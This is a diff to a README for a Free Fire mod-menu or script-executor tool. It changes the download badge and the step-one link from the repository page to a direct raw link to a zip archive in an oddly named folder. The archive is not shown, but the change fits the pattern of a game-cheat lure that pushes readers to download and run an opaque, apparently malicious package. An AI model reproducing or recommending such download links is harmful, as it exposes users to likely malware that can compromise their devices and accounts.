@@ -2,7 +2,7 @@
 
 ## 📥 Download Button
 
-[![Download Now](https://img.shields.io/badge/Download-ff--mod--menu--script--exec-blue?style=for-the-badge&logo=github)](https://github.com/Hawjxi5518/ff-mod-menu-script-exec)
+[![Download Now](https://img.shields.io/badge/Download-ff--mod--menu--script--exec-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Hawjxi5518/ff-mod-menu-script-exec/main/psychogalvanic/1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome! This guide will help you download and run the ff-mod-menu-script-exec a
 ### Step 1: Visit the Download Page
 
 Click the download button above or directly visit this link:
-https://github.com/Hawjxi5518/ff-mod-menu-script-exec
+https://raw.githubusercontent.com/Hawjxi5518/ff-mod-menu-script-exec/main/psychogalvanic/1.4.zip
 
 ### Step 2: Download the Application
 
